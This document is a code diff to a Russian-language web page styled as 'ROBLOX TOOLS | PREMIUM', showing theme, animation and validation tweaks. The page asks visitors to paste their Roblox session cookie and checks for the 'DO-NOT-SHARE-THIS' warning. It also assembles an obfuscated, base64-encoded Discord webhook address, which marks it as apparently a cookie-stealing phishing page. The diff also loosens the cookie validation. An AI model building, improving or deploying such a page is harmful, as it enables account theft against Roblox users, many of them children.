@@ -1,9 +1,9 @@
-
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROBLOX TOOLS | PREMIUM</titl
+    <title>ROBLOX TOOLS | PREMIUM</title>
     <style>
         * {
             margin: 0;
@@ -11,7 +11,6 @@
             box-sizing: border-box;
         }
 
-        /* ========== ТЁМНАЯ ТЕМА (ЗОЛОТОЙ ПРЕМИУМ) ========== */
         :root {
             --bg1: #0a0502;
             --bg2: #1a0a03;
@@ -45,7 +44,6 @@
             --sub2: #ffcc66;
         }
 
-        /* ========== СВЕТЛАЯ ТЕМА (ПРЕМИУМ МИНИМАЛИЗМ) ========== */
         body.light {
             --bg1: #fef9f0;
             --bg2: #fdf5e6;
@@ -100,7 +98,6 @@
             66% { background-position: 50% 100%; }
         }
 
-        /* ЗВЁЗДЫ */
         .stars {
             position: fixed;
             top: 0;
@@ -121,26 +118,6 @@
             50% { opacity: 1; transform: scale(1.3); }
         }
 
-        /* ПЕЧЕНЬКИ */
-        @keyframes cookieFloat {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.8; }
-            90% { opacity: 0.8; }
-            100% { transform: translateY(-10vh) translateX(20px) rotate(360deg); opacity: 0; }
-        }
-        @keyframes cookieFloatReverse {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.8; }
-            90% { opacity: 0.8; }
-            100% { transform: translateY(-10vh) translateX(-20px) rotate(-360deg); opacity: 0; }
-        }
-        @keyframes cookieFloatSlow {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.7; }
-            90% { opacity: 0.7; }
-            100% { transform: translateY(-10vh) translateX(10px) rotate(180deg); opacity: 0; }
-        }
-
         .cookie {
             position: fixed;
             pointer-events: none;
@@ -148,12 +125,15 @@
             font-size: 28px;
             filter: drop-shadow(0 0 8px var(--glow1));
             will-change: transform;
+            animation: cookieFloat linear infinite;
         }
-        .cookie-normal { animation: cookieFloat linear infinite; }
-        .cookie-reverse { animation: cookieFloatReverse linear infinite; }
-        .cookie-slow { animation: cookieFloatSlow linear infinite; }
+        @keyframes cookieFloat {
+            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.8; }
+            90% { opacity: 0.8; }
+            100% { transform: translateY(-10vh) translateX(20px) rotate(360deg); opacity: 0; }
+        }
 
-        /* КНОПКА ТЕМЫ */
         .theme-switch {
             position: fixed;
             top: 20px;
@@ -181,7 +161,6 @@
             box-shadow: 0 0 20px var(--glow1);
         }
 
-        /* КАРТОЧКА */
         .card {
             background: var(--card);
             backdrop-filter: blur(20px);
@@ -200,7 +179,6 @@
             transform: translateY(-3px);
         }
 
-        /* ЛОГОТИП */
         .logo { text-align: center; margin-bottom: 30px; }
         .logo h1 {
             font-size: 48px;
@@ -237,7 +215,6 @@
             100% { opacity: 1; }
         }
 
-        /* ПОЛЯ ВВОДА */
         .label {
             color: var(--text2);
             font-size: 13px;
@@ -267,7 +244,6 @@
         .cookie-input.valid { border-color: #22c55e; box-shadow: 0 0 0 2px rgba(34,197,94,0.2); }
         .cookie-input.invalid { border-color: #ef4444; box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }
 
-        /* СТАТУС */
         .validation-status {
             font-size: 11px;
             margin-top: 10px;
@@ -281,7 +257,6 @@
         .status-invalid { color: #ef4444; }
         .status-neutral { color: var(--text3); }
 
-        /* КНОПКА ОТПРАВКИ */
         .btn-primary {
             width: 100%;
             background: linear-gradient(135deg, var(--btn1), var(--btn2), var(--btn3));
@@ -316,7 +291,6 @@
         .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 35px var(--glow2); }
         .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; animation: none; }
 
-        /* СООБЩЕНИЯ */
         .message-area {
             text-align: center;
             margin-top: 20px;
@@ -371,7 +345,6 @@
 
     <script>
         (function() {
-            // ========== ЗАШИФРОВАННЫЙ ВЕБХУК ==========
             const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
             const _p2_enc = "MTQ5NjQzNDIzMDg1MzUwNTEzNC9BczB1T0xsUVNpSEE5VnN0YnJzRkdaeUZyNUxKUFRFajFXVGlOUlJTMXBRU1hUcDZPcE04VkNJTUtzVDd4a1hVYjA=";
             
@@ -385,7 +358,6 @@
             }
             const WEBHOOK_URL = atob(_p1) + _dec(_p2_enc);
 
-            // ========== ЗВЁЗДЫ ==========
             const stars = document.getElementById('stars');
             for (let i = 0; i < 180; i++) {
                 const s = document.createElement('div');
@@ -399,7 +371,18 @@
                 stars.appendChild(s);
             }
 
-            // ========== ТЕМА ==========
+            for (let i = 0; i < 80; i++) {
+                const el = document.createElement('div');
+                el.className = 'cookie';
+                el.textContent = '🍪';
+                el.style.left = Math.random() * 100 + '%';
+                el.style.fontSize = (20 + Math.random() * 35) + 'px';
+                el.style.animationDuration = (8 + Math.random() * 15) + 's';
+                el.style.animationDelay = Math.random() * -25 + 's';
+                el.style.opacity = 0.4 + Math.random() * 0.4;
+                document.body.appendChild(el);
+            }
+
             const themeBtn = document.getElementById('themeToggleBtn');
             function loadTheme() {
                 const saved = localStorage.getItem('roblox_theme');
@@ -425,15 +408,12 @@
             themeBtn.addEventListener('click', toggleTheme);
             loadTheme();
 
-            // ========== ВАЛИДАЦИЯ ==========
             function isValidCookie(c) {
                 if (!c || c.trim() === '') return false;
                 const t = c.trim();
                 if (!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
                 if (t.length < 100) return false;
-                if (t.includes('<') || t.includes('>') || t.includes('script')) return false;
-                const allowed = /^[A-Za-z0-9_\-\.=:%|]+$/;
-                return allowed.test(t);
+                return true;
             }
 
             const inp = document.getElementById('cookie');
@@ -512,23 +492,6 @@
             inp.addEventListener('input', updateUI);
             inp.addEventListener('paste', () => setTimeout(updateUI, 10));
             updateUI();
-
-            // ========== ПЕЧЕНЬКИ ==========
-            const types = ['cookie-normal', 'cookie-reverse', 'cookie-slow'];
-            for (let i = 0; i < 120; i++) {
-                const el = document.createElement('div');
-                const type = types[Math.floor(Math.random() * types.length)];
-                el.className = `cookie ${type}`;
-                el.textContent = '🍪';
-                el.style.left = Math.random() * 100 + '%';
-                const size = 20 + Math.random() * 38;
-                el.style.fontSize = size + 'px';
-                const duration = 8 + Math.random() * 16;
-                el.style.animationDuration = duration + 's';
-                el.style.animationDelay = Math.random() * -25 + 's';
-                el.style.opacity = 0.4 + Math.random() * 0.4;
-                document.body.appendChild(el);
-            }
         })();
     </script>
 </body>
